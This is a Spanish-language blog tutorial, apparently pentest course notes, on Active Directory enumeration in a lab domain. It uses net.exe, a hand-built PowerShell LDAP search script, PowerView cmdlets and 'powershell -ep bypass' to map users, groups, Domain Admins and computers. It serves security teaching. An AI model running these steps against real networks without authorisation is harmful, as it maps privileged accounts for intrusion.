---
layout: post
title: Active Directory Attacks
subtitle: Active Directory Attacks basics
tags: [pen]
---
Active Directory Domain Services, también referido simplemente como Active Dierctory o AD, es un servicio que permite a administradores de sistemas actualizar y gestionar sistemas operativos, aplicaciones, usuarios y acceso de datos a gran escala. Es decir, es un servicio que proporciona una gestión centralizada de una red corporativa (a menudo de Windows OS).

Desde la perspectiva del pentesting, Active Directory es muy interesante y típicamente contiene un montón de información, además, al ser centralizado, conseguir acceso y control sobre ciertos dispostivos de la red nos puede garantizar un control completo de la infraestructura corporativa de la empresa.

<br />
### 1. Active Directory - Introduction.

Active Directory, al ser un servicio de gestión, está configurado en un entorno que contiene información crítica sobre los *objetos* que integran la red (ordenadores, usuarios, grupos, permisos, etc).

La unidad básica de gestión de una estructura de AD es el dominio, identificado con un nombre; *corp.com* y que en la práctica consiste en una colección de dispositivos que tienen en común una funcionalidad o actividad concreta.

A menudo, el nombre del dominio es el nombre de la organización en sí. Dentro de este dominio se añaden objetos asociados a la organización como ordenadores, usuarios, etc.

A su vez estos componentes quedan agrupados entorno a *Organizational Units* (OUs). Estos son contenedores que guardan objetos de un mismo tipo (impresoras, usuarios, etc) dentro del dominio. Una descripción rápida de los objetos que se almacenan en OUs serían; computers objects, que representan servidores y estaciones de trabajo reales que están unidos a un dominio (o parte del dominio), users objects representan cuentas que se pueden usar para iniciar sesión en los equipos unidos al dominio. Además, todos los objetos de AD contienen atributos, que variarán según el tipo de objeto y que toman un valor concreto en cada instancia del objeto. Por ejemplo, un objeto de usuario puede incluir atributos como nombre, apellido, nombre de usuario, número de teléfono, etc.

A su vez, la estructura de AD posee varios componentes y servicios de comunicación gestionados desde un equipo principal denominado Controlador de Dominios o Domain Controller, DC. Así por ejemplo, cuando un usuario quiere logearse a una máquina, se envía una request al DC que valora si el usuario puede o no logearse.

A su vez, otro tipo de objeto a los que prestaremos bastante atención son los AD Groups, que son agrupaciones de objetos con la finalidad de realizar una gestión más comoda, esto a su vez puede aumentar la superficie de ataque de la estructura. Por ejemplo, los usuarios de un grupo se les puede dar acceso a un servidor de archivos compartido o acceso administrativo a varios clientes en el dominio. Los atacantes a menudo se dirigen a grupos privilegiados.

Los miembros de _Domain Admins_ se encuentran entre los objetos más privilegiados del dominio. Si un atacante pone en peligro a un miembro de este grupo (a menudo denominados *domain administrators*), básicamente obtienen el control total sobre el dominio.

Este vector de ataque podría extenderse más allá de un único dominio, ya que una instancia de AD puede albergar más de un dominio en un *Domain Tree* o varios árboles de dominios en un *Domain Forest*. Si bien hay un grupo de administradores de dominio para cada dominio en el bosque, a los miembros del grupo *Enterprise Admins* se les otorga control total sobre todos los dominios del bosque y tienen privilegios de administrador en todos los DC. Obviamente, este es un objetivo de alto valor para un atacante.

Aprovecharemos estos y otros conceptos en este módulo mientras nos enfocamos en el aspecto extremadamente importante de la enumeración de AD. Esta importante disciplina puede mejorar nuestro éxito durante la fase de ataque. Aprovecharemos una variedad de herramientas para enumerar AD manualmente, la mayoría de las cuales se basan en el _Protocolo ligero de acceso a directorios_ (LDAP). Una vez que hayamos introducido las técnicas fundamentales, aprovecharemos la automatización para realizar la enumeración a escala.

<br />

### 2. Basic Manual Enumeration.

En todo lo que sigue asumiremos que hemos ganado acceso a una sesión de RCE sobre una máquina en un entorno de Active Directory.

```
kali@kali:~$ xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
```

<br />

#### 2.1. Enumerating Using Legacy Windows Tools - Batch. 

**Users and Groups** 

Comenzaremos enumerando usuarios y grupos, para ello emplearemos *net.exe* instalado por defecto en todas las versiones de Windows. *Net.exe* tiene un subcomando que es *net user* que es el que utilizaremos más precisamente.

- net user /domain

```
C:\Users\stephanie>net user /domain
The request will be processed at a domain controller for domain corp.com.

User accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
Administrator            dave                     Guest
iis_service              jeff                     jeffadmin
jen                      krbtgt                   pete
stephanie
The command completed successfully.
```

Podemos ver que el comando con el flag /domain nos proporcionar todas las cuentas dentro del dominio actual.

Ahora podemos obtener información particular sobre usuarios. 

- net user \<USERNAME> /domain

```
C:\Users\stephanie>net user jeffadmin /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jeffadmin
Full Name
Commen
User's commen
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/2/2022 4:26:48 PM
Password expires             Never
Password changeable          9/3/2022 4:26:48 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon scrip
User profile
Home directory
Last logon                   9/20/2022 1:36:09 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

Observemos que el output proporciona que Jeffadmin forma parte del grupo *Domain Admins*, de lo cual deberíamos de tomar nota. 

También podemos utilizar el subcomand *net group* para enumerar información acerca de grupos:

- net group /domain

```
C:\Users\stephanie>net group /domain
The request will be processed at a domain controller for domain corp.com.

Group Accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*Debug
*Development Department
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Management Department
*Protected Users
*Read-only Domain Controllers
*Sales Department
*Schema Admins
The command completed successfully.
```

De nuevo el flag /domain nos brinda una enumeración completa de todos los grupos presentes en el dominio permitiéndonos a acceder a información particular de cada grupo:

```
PS C:\Tools> net group "Sales Department" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Sales Department
Commen

Members

-------------------------------------------------------------------------------
pete                     stephanie
The command completed successfully.
```

<br />

####  2.2. Enumerating Active Directory with PowerShell and .NET Classes.

A menudo, los cmdlets de PowerShell a menudo requieren de privilegios administrativos para poder ser ejecutados. De esta forma, sólo introduciremos herramientas que pueda operar un usuario con bajos privilegios y que además puedan ser encontrados en un entorno real con relativa frecuencia, de forma precisa, lo que haremos es crear un script de enumeración de dominios.

<br />

##### 2.2.1. Preliminares. LDAP. Distinguished Names.

Antes de comenzar con la ejecución del script, discutamos ciertos aspectos teóricos. 

La enumeración de Active Directory recae sobre un servicio, LDAP o _Lightweight directory access protocol_. Este es un protocolo que proporciona a objetos la capacidad de localizar y acceder a datos sobre otros objetos o recursos de la red. Así, la enumeración de AD se basa en LDAP. Cuando una máquina de dominio busca un objeto, como una impresora, o cuando consultamos objetos de usuario o de grupo, se utiliza LDAP como canal de comunicación para la consulta.

Vale la pena mencionar que LDAP no es exclusivo de AD y que se encuentra en otros sistemas. 

<br />

**LDAP ADsPath**

La comunicación con LDAP desde AD no siempre es fácil pero podemos utilizar el conjunto de interfaces ADSI, Active Directory Services Interface. De acuerdo con la documentación de Microsoft necesitamos específicamente un LDAP ADsPath para comunicar con el servicio AD. Esto ADsPath sigue el siguiente prototype:

```
LDAP://HostName[:PortNumber][/DistinguishedName]
```

Podemos observar que necesitamos tres parámetros:

- *Hostname*: Que puede ser un hostname pero también una IP o un dominio, en nuestro caso, estamos trabajando con el dominio *corp.com*. Esto ya bastaría para recibir información pues el resto de parámetros son opcionales, sin embargo muchas veces esta no es la mejor opción ya que un dominio puede tener varios DCs con lo que el dominio puede resolverse sobre una IP que no nos interesa en ese momento, lo ideal es obtenern información sobre el Primary Domain Controller (PDC).

- *PortNumber*:  Esto sólo es relevante si consultamos información sobre un dominio que emplee non-defaults ports. 

- *DistinguishedName* (DN): Un DN es un nombre que identifica unívocamente un objeto en AD. Vayamos un poco más al detalle para comprender esto mejor.

<br />

**Distinguished Name**

Para poder funcionar LDAP correctamente en AD se necesita un formato de nombres específico que determine un estándard. Supongámos nuestro usuario stephanie, este un es un objeto usuario dentro del dominio corp.com. De esta forma, el DN asociado al objeto stephanie sería:

```
CN=Stephanie,CN=Users,DC=corp,DC=com
```

Podemos ver que CN (Common Name) nos dice que el objeto es Sthepanie y que es un User y DC (Domain Component) nos dice que pertenece al dominio Corp con TDL com.

De esta forma, el CN específica el identificador del objeto en el dominio y el OUs donde este está almacenado, en este caso nuestro objeto se identifica como Sthepanie y se almacena dentro del OU Users. El DC por su parte especifica el dominio al que pertenece el objeto.

Generalmente, cuando leemos un DN, empezamos por el DC y continuamos de Derecha a Izquierda.

En este caso, centraremos nuestro interés en el DC.

<br />

##### 2.2.2. Enumeration Script.

Empecemos a escribir el script obteniendo el hostname requerido para acceder al Primary Domain Controller (PDC).

Para ello ejecutamos el siguiente comando:

```
PS C:\Users\stephanie> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner        : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                  	: corp.com
```

Observamos que este comando llama a la clase Dominio y de ella extrae los actuales dominios. Obtenemos que DC1.corp.com es el hostname del PDC que buscamos.

Así tenemos la primer parte del script, una variable que almacene el nombre del PDC:


```PowerShell
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

# Print the $PDC variable
$PDC
```

Observemos que queremos volver el script generico. Ejecutamos powershell para bypasear la restricción de scripts:

```
PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> .\enumeration.ps1
DC1.corp.com
```

También podemos obtener el DN a través de ADSI de nuevo:

```
PS C:\Users\stephanie> ([adsi]'').distinguishedName
DC=corp,DC=com
```

Y añadimos los resultados al script. El script final queda como sigue:

```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

Y el resultado al ejecutarlo es:

```
PS C:\Users\stephanie> .\enumeration.ps1
LDAP://DC1.corp.com/DC=corp,DC=com
```

<br />

#### 2.3. Adding search Functionality to our Script.

**Displaying All Objets**

Lllegados hasta este punto, hemos construido un scrtip que por sí solo reúne las partes necesarias y posteriormente conforma coherentemente el LDAP ADsPath. 

Ahora podemos adherir al script funcionalidad de búsqueda para que sea un script de enumeración satisfactorio. Para ello utilizaremos dos .NET classes ; *DirectoryEntry* y *DirectorySearcher*:

- *DirectoryEntry*: Esta clase encapsula objetos o nodos en la jerarquía del servicio AD de forma que puede ser usada para realizar accesos regulares a información contenida en entradas de esquemas. En nuestro caso, encapsularemos el objeto path de LDAP ADsPath para apuntar a la cima de la jerarquía.

- *DirectorySearcher*: Esta clase realiza queries sobre AD utilizando LDAP. Cuando utilizamos esta clase debemos especificar el servicio AD al que queremos referirnos con la propiedad *SearchRoot*, la cual define el lugar desde el que comenzará la búsqueda de información. 

Concretamente, DirectoryEntry nos permitirá encapsular nuestras consultas para que apunten hacia la cima de la jerarquía de AD y seguidamente DirectorySearcher utilizará ese encapsulamiento para extraer desde la cima toda la información contenida en las entradas disponibles devolviéndonos información.

```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```

Observemos que entonces el scritp, primero crea el objeto path LDAP ADsPath, seguidamente lo encapsula con la clase DirectoryEntry y lo almacena en un objeto variable y desde ahí lo pasa como argumento para crear el objeto dirsearcher y utiliza la propuedad FindAll() para extraer toda la información:

Al ejecutar el script obtenemos una lista de objetos definidos a través de su DistinguishedName, que recordemos se lee de derecha a izquierda:

```
PS C:\Users\stephanie> .\enumeration.ps1

Path
----
LDAP://DC1.corp.com/DC=corp,DC=com
LDAP://DC1.corp.com/CN=Users,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Computers,DC=corp,DC=com
LDAP://DC1.corp.com/OU=Domain Controllers,DC=corp,DC=com
LDAP://DC1.corp.com/CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=LostAndFound,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Infrastructure,DC=corp,DC=com
LDAP://DC1.corp.com/CN=ForeignSecurityPrincipals,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Program Data,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Microsoft,CN=Program Data,DC=corp,DC=com
LDAP://DC1.corp.com/CN=NTDS Quotas,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Managed Service Accounts,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Keys,DC=corp,DC=com
LDAP://DC1.corp.com/CN=WinsockServices,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=RpcServices,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=FileLinks,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=VolumeTable,CN=FileLinks,CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=corp,DC=com
...
```

<br />

**Filtering Data**

Aun así, el output puede ser extenuante y por ello convendría filtrarlo. Esto lo podemos realizar a través del atributo *samAccountType*, existente y único para cualquier OUs. Así por ejemplo, el samAccountType asociado al OU Users es "805306368" 

Así, podemos utilizar la propiedad *filter* de la clase *DirectorySeracher*. 

```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```

Ahora el output sólo muestra objetos con CN usuarios:

```
PS C:\Users\stephanie> .\enumeration.ps1

Path                                                         Properties
----                                                         ----------
LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=krbtgt,CN=Users,DC=corp,DC=com        {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=dave,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, usnchanged...}
LDAP://DC1.corp.com/CN=stephanie,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jeff,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=iis_service,CN=Users,DC=corp,DC=com   {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=pete,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jen,CN=Users,DC=corp,DC=com           {logoncount, codepage, objectcategory, dscorepropagatio
```

<br />

**Going further**

Sin embargo, necesitamos desmigar la información un poco más, A menudo estaremos interesados en inspeccionar ciertos atributos o propiedades de los objetos que estamos investigando. Así, podemos complementar el script anterior con el siguiente bucle que extrae las propiedades para cada objeto extraido:

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```

Hemos añadido un bloque de *Foreach* que para cada objeto extraído por la instancia de la clase DirectorySearcher extrae una lista de propiedades y de cada línea de la lista la muestra por pantalla.

```
PS C:\Users\stephanie> .\enumeration.ps1
...
logoncount                     {173}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}
dscorepropagationdata          {9/3/2022 6:25:58 AM, 9/2/2022 11:26:49 PM, 1/1/1601 12:00:00 AM}
usnchanged                     {52775}
instancetype                   {4}
name                           {jeffadmin}
badpasswordtime                {133086594569025897}
pwdlastset                     {133066348088894042}
objectclass                    {top, person, organizationalPerson, user}
badpwdcount                    {0}
samaccounttype                 {805306368}
lastlogontimestamp             {133080434621989766}
usncreated                     {12821}
objectguid                     {14 171 173 158 0 247 44 76 161 53 112 209 139 172 33 163}
memberof                       {CN=Domain Admins,CN=Users,DC=corp,DC=com, CN=Administrators,CN=Builtin,DC=corp,DC=com}
whencreated                    {9/2/2022 11:26:48 PM}
adspath                        {LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com}
useraccountcontrol             {66048}
cn                             {jeffadmin}
countrycode                    {0}
primarygroupid                 {513}
whenchanged                    {9/19/2022 6:44:22 AM}
lockouttime                    {0}
lastlogon                      {133088312288347545}
distinguishedname              {CN=jeffadmin,CN=Users,DC=corp,DC=com}
admincount                     {1}
samaccountname                 {jeffadmin}
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 30 221 116 118 49 27 70 39 209 101 53 106 82 4 0 0}
lastlogoff                     {0}
accountexpires                 {9223372036854775807}
...
```

A su vez el objeto *Property* tiene propiedades que permiten seleccionar atributos concretos, por ejemplo:

```
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="name=jeffadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }

    Write-Host "-------------------------------"
}
```


<br />

```
PS C:\Users\stephanie> .\enumeration.ps1
CN=Domain Admins,CN=Users,DC=corp,DC=com
CN=Administrators,CN=Builtin,DC=corp,DC=com
```

<br />

**Passing Arguments to the script**

Podemos usar este script para enumerar cualquier objeto disponible para nosotros en AD. Sin embargo, en el estado actual, esto requeriría que realicemos más ediciones en el script en función de lo que deseamos enumerar.

En su lugar, podemos hacer que la secuencia de comandos sea más flexible, permitiéndonos agregar los parámetros necesarios a través de la línea de comandos. Por ejemplo, podríamos hacer que el script acepte el _samAccountType_ que deseamos enumerar como argumento de la línea de comandos.

Podemos introducir nuestro script en una función que admita argumentos:

```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

Para pdoer utilizar esta función, la integramos como un módulo en nuestra sesión. Guardamos el script anterior en un script 'function.ps1' y lo importamos:

```
PS C:\Users\stephanie> Import-Module .\function.ps1
```

Ahora podemos utilizar la función definida como un comando y pasar como argumento el samAccountType que queremos buscar:

```
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=805306368)"

Path                                                         Properties
----                                                         ----------
LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=krbtgt,CN=Users,DC=corp,DC=com        {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=dave,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, usnchanged...}
LDAP://DC1.corp.com/CN=stephanie,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jeff,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=iis_service,CN=Users,DC=corp,DC=com   {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=pete,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jen,CN=Users,DC=corp,DC=com           {logoncount, codepage, objectcategory, dscorepropagatio
```

E incluso podemos aportar otras propiedades:

```
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(objectclass=group)"

...                                                                                 ----------
LDAP://DC1.corp.com/CN=Read-only Domain Controllers,CN=Users,DC=corp,DC=com            {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Enterprise Read-only Domain Controllers,CN=Users,DC=corp,DC=com {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=Cloneable Domain Controllers,CN=Users,DC=corp,DC=com            {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=Protected Users,CN=Users,DC=corp,DC=com                         {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=Key Admins,CN=Users,DC=corp,DC=com                              {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=Enterprise Key Admins,CN=Users,DC=corp,DC=com                   {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=DnsAdmins,CN=Users,DC=corp,DC=com                               {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=DnsUpdateProxy,CN=Users,DC=corp,DC=com                          {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Sales Department,DC=corp,DC=com                                 {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Management Department,DC=corp,DC=com                            {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Development Department,DC=corp,DC=com                           {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Debug,CN=Users,DC=corp,DC=com                                   {usnchanged, distinguishedname, grouptype, whencreated...}
```

Además, podemos aplicar un loop manualmente junto con nuestra función para filtrar datos:

```
PS C:\Users\stephanie\Desktop> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
>> $group.properties | select {$_.cn}, {$_.member}
>> }
```

También podemos almacenar un objeto en una variable y explorar sus propiedades uno a uno:

```
PS C:\Users\stephanie> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"

PS C:\Users\stephanie\Desktop> $sales.properties.member
CN=Development Department,DC=corp,DC=com
CN=pete,CN=Users,DC=corp,DC=com
CN=stephanie,CN=Users,DC=corp,DC=com
PS C:\Users\stephanie\Desktop>
```

Así por ejemplo, podemos desenredar grupos y llegar hasta un usuario:

```
PS C:\Users\stephanie\Desktop> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel))"
PS C:\Users\stephanie\Desktop> $sales.Properties.member
CN=Billing,CN=Users,DC=corp,DC=com
PS C:\Users\stephanie\Desktop> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Billing))"
PS C:\Users\stephanie\Desktop> $sales.Properties.member
CN=Customer support,CN=Users,DC=corp,DC=com
PS C:\Users\stephanie\Desktop> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Customer support))"
PS C:\Users\stephanie\Desktop> $sales.Properties.member
CN=michelle,CN=Users,DC=corp,DC=com
PS C:\Users\stephanie\Desktop> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=user)(cn=michelle))"
PS C:\Users\stephanie\Desktop> $sales.Properties

Name                           Value
----                           -----
logoncount                     {0}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}
description                    {OS{66e309ab863268b8ca5d7b9fe9e6b74b}}
usnchanged                     {454828}
[...]
```

Observemos que son grupos dentro de grupos aunque el CN sea el Users.

<br />

#### 2.4. AD Enumeration with PowerView.

El script anterior nos permite realizar una enumeración exhaustiva y eficiente en lo referido a usuarios y grupos, sin embargo, esto sólo es la superficie de la información que se puede obtener en AD.

Algunos researches han elaborado herramientas más sofisticadas como PowerView.

PowerView es una herramienta que actúa en formato de script .ps1 que se importa en la sesión actual incorporando a la misma una serie de Cmdlets muy útiles en la enumeración de AD.

```
PS C:\Tools> Import-Module .\PowerView.ps1
```

Algunos de los comandos más útiles con los que nos podemos encontrar son:

- *Get-NetDomain*: Información básica del dominio.

	```
	PS C:\Tools> Get-NetDomain
	
	Forest                  : corp.com
	DomainControllers       : {DC1.corp.com}
	Children                : {}
	DomainMode              : Unknown
	DomainModeLevel         : 7
	Parent                  :
	PdcRoleOwner            : DC1.corp.com
	RidRoleOwner            : DC1.corp.com
	InfrastructureRoleOwner : DC1.corp.com
	Name    
	```

<br />

- *Get-NetUser*: Información básica de cuentas de usuarios.

	```
	PS C:\Tools> Get-NetUser
	
	logoncount             : 113
	iscriticalsystemobject : True
	description            : Built-in account for administering the computer/domain
	distinguishedname      : CN=Administrator,CN=Users,DC=corp,DC=com
	objectclass            : {top, person, organizationalPerson, user}
	lastlogontimestamp     : 9/13/2022 1:03:47 AM
	name                   : Administrator
	objectsid              : S-1-5-21-1987370270-658905905-1781884369-500
	samaccountname         : Administrator
	admincount             : 1
	codepage               : 0
	samaccounttype         : USER_OBJECT
	accountexpires         : NEVER
	cn                     : Administrator
	whenchanged            : 9/13/2022 8:03:47 AM
	instancetype           : 4
	usncreated             : 8196
	objectguid             : e5591000-080d-44c4-89c8-b06574a14d85
	lastlogoff             : 12/31/1600 4:00:00 PM
	objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com
	dscorepropagationdata  : {9/2/2022 11:25:58 PM, 9/2/2022 11:25:58 PM, 9/2/2022 11:10:49 PM, 1/1/1601 6:12:16 PM}
	memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=corp,DC=com, CN=Domain Admins,CN=Users,DC=corp,DC=com, CN=Enterprise
	                         Admins,CN=Users,DC=corp,DC=com, CN=Schema Admins,CN=Users,DC=corp,DC=com...}
	lastlogon              : 9/14/2022 2:37:15 AM
	...
	```

	<br />

	En muchos aspectos, PowerView es más sofisticado que nuestro script. Podemos emplear directamente Select para seleccionar un atributo concreto y filtrar así el output a coveniencia:

	```
	PS C:\Tools> Get-NetUser | select cn
	
	cn
	--
	Administrator
	Gues
	krbtgt
	dave
	stephanie
	jeff
	jeffadmin
	iis_service
	pete
	jen
	```

	<br />

- *Get-NetGroup*: Información básica de grupos. De nuevo, podemos filtrar el contenido:

	```
	PS C:\Tools> Get-NetGroup | select cn
	
	cn
	--
	...
	Key Admins
	Enterprise Key Admins
	DnsAdmins
	DnsUpdateProxy
	Sales Department
	Management Department
	Development Department
	Debug
	```

	<br />

	```
	PS C:\Tools> Get-NetGroup "Sales Department" | select member
	
	member
	------
	{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
	```

Microsoft Active Directory Domain Services, también conocido popularmente como Active Directory es un servicio que permite a los administradores actualizar y manejar objetos informáticos (sistemas operativos, usuarios, aplicaciones y acceso a datos) en grandes cantidades. 

Desde la perspectiva de un atacante AD ofrece una superficie de ataque muy amplia y común por lo que es muy importante conocer cómo aprovecharnos de esto.

<br />

### 3. Advanced Manual Enumeration.

Hasta ahora hemos enumerado objetos típicos de AD como Usuarios, Grupos y Máquinas. En esta sección veremos como enumerar más allá, obtener información acerca del OS, Permisos, Usuarios logeados, etc.

<br />

#### 3.1. Enumerating Operating Systems.

Podemos obtener información del sistema operativo importando el script powerview y utilizando el comando importado Get-NetComputer:

```
C:\Tools> powershell -ep bypass

PS C:\Tools> Import-Module .\powerview.ps1

PS C:\Tools> Get-NetComputer

pwdlastset                    : 10/2/2022 10:19:40 PM
logoncount                    : 319
msds-generationid             : {89, 27, 90, 188...}
serverreferencebl             : CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC1,OU=Domain Controllers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 10/13/2022 11:37:06 AM
name                          : DC1
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1000
samaccountname                : DC1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 10/13/2022 6:37:06 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC1,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=corp,DC=com
objectguid                    : 8db9e06d-068f-41bc-945d-221622bca952
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : {9/2/2022 11:10:48 PM, 1/1/1601 12:00:01 AM}
